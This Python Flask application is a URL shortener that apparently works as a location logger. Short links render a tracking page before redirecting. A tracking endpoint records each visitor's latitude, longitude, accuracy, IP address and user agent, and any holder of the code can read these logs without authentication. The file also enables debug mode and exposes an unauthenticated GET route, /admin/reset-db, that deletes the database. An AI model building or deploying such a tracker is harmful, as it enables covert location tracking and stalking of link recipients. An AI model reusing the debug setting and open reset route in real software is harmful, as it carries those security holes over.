from flask import Flask, request, jsonify, render_template, redirect
import sqlite3
import uuid
import logging
import os

app = Flask(__name__)
app.config['DEBUG'] = True

logging.basicConfig(level=logging.INFO)

DB_NAME = 'database.db'

def init_db(force_reset=False):
    if force_reset and os.path.exists(DB_NAME):
        try:
            os.remove(DB_NAME)
            logging.info("Old database deleted")
        except:
            pass

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    if force_reset:
        c.execute('DROP TABLE IF EXISTS links')
        c.execute('DROP TABLE IF EXISTS logs')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS links (
            id TEXT PRIMARY KEY,
            original_url TEXT NOT NULL,
            short_code TEXT UNIQUE NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_code TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
            ip TEXT,
            user_agent TEXT
        )
    ''')
    conn.commit()
    conn.close()

# Initialize DB (set to True only when you want to reset everything)
init_db(force_reset=False)

# ====================== ROUTES ======================

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/shorten', methods=['POST'])
def shorten():
    data = request.get_json()
    original_url = data.get('original_url')
    
    if not original_url:
        return jsonify({'error': 'URL is required'}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    for _ in range(5):
        short_code = str(uuid.uuid4())[:8].lower()
        try:
            c.execute('INSERT INTO links (id, original_url, short_code) VALUES (?, ?, ?)',
                      (str(uuid.uuid4()), original_url, short_code))
            conn.commit()
            short_url = f"{request.host_url.rstrip('/')}/{short_code}"
            conn.close()
            return jsonify({'short_url': short_url, 'short_code': short_code})
        except sqlite3.IntegrityError:
            continue
    conn.close()
    return jsonify({'error': 'Failed to create unique short code'}), 500

@app.route('/<short_code>')
def track(short_code):
    return render_template('track.html', short_code=short_code.strip().lower())

@app.route('/api/track/<short_code>', methods=['POST'])
def log_location(short_code):
    short_code = short_code.strip().lower()
    data = request.get_json() or {}
    
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
    if not c.fetchone():
        conn.close()
        return jsonify({'error': 'Link not found'}), 404
    
    c.execute('''
        INSERT INTO logs (short_code, latitude, longitude, accuracy, ip, user_agent)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (short_code, latitude, longitude, accuracy, ip, user_agent))
    
    conn.commit()
    conn.close()
    return jsonify({'status': 'logged'})

@app.route('/redirect/<short_code>')
def final_redirect(short_code):
    short_code = short_code.strip().lower()
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
    result = c.fetchone()
    conn.close()
    
    if result:
        return redirect(result[0])
    return "Link not found", 404

@app.route('/logs/<short_code>')
def logs_page(short_code):
    return render_template('logs.html', short_code=short_code.lower())

@app.route('/api/logs/<short_code>')
def get_logs(short_code):
    short_code = short_code.strip().lower()
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        SELECT latitude, longitude, accuracy, timestamp, ip, user_agent 
        FROM logs 
        WHERE short_code = ? 
        ORDER BY timestamp DESC
    ''', (short_code,))
    logs = c.fetchall()
    conn.close()
    
    return jsonify([{
        'lat': row[0], 'lng': row[1], 'accuracy': row[2],
        'time': row[3], 'ip': row[4], 'user_agent': row[5]
    } for row in logs])

# Reset Database
@app.route('/admin/reset-db')
def reset_database():
    init_db(force_reset=True)
    return "✅ Database reset successfully!<br><a href='/'>Go to Home</a>"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
